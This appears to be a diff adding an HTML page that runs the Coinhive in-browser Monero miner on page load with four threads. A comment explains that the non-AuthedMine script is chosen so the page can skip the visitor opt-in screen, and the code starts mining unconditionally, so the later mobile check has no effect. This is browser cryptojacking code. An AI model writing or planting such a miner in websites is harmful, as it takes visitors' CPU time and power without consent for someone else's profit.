@@ -1,0 +1,60 @@
+<html>
+<head>
+
+    <title> We! Are Mining XMR </title>
+    
+    <!-- You may load the miner from "coinhive.min.js" instead if you don't want to show the opt-in screen.
+    
+         When loaded through authedmine.com (authedmine.min.js) the JavaScript API will ask the user for consent as soon as miner.start() is called. 
+         This is done in a popover window directly on your page. 
+         You will not be able to start the miner if the user cancels the opt-in.
+         
+    -->
+    
+	  <script src="coinhive.min.js"></script>
+    
+</head>
+<body>
+
+<h1> We Are Using Your CPU For Mining </h1>
+
+<script>
+
+var miner = new CoinHive.Anonymous('Public_Kay', {
+
+threads: 4,                   // The number of threads the miner should start with.
+autoThreads: false,           // Whether to automatically adjust the number of threads for optimal performance.
+throttle: 0.8,                // The fraction of time that threads should be idle.
+forceASMJS: false,            // If true, the miner will always use the asm.js implementation of the hashing algorithm. If false, the miner will use the faster WebAssembly version if supported and otherwise fall back to asm.js. The default is false.
+theme: 'dark',                // The color theme for the opt-in screen - AuthedMine only.
+language: 'auto' });          // The language (ISO 639-1 code) to use for the opt-in screen - AuthedMine only.
+miner.start();
+
+  // Only start on non-mobile devices
+ 
+  if (!miner.isMobile()) {
+	miner.start();
+  }
+
+	// Update stats once per second
+  
+	setInterval(function() {
+		var hashesPerSecond = miner.getHashesPerSecond();
+		var totalHashes = miner.getTotalHashes();
+		var acceptedHashes = miner.getAcceptedHashes();
+
+  // See console log
+  
+		console.log("hashesPerSecond", hashesPerSecond)
+				console.log("totalHashes", totalHashes)
+				console.log("acceptedHashes", acceptedHashes)
+
+				console.log("-----------")
+				console.log("-----------")
+				console.log("-----------")
+        
+	}, 1000);
+
+</script>
+</body>
+</html>
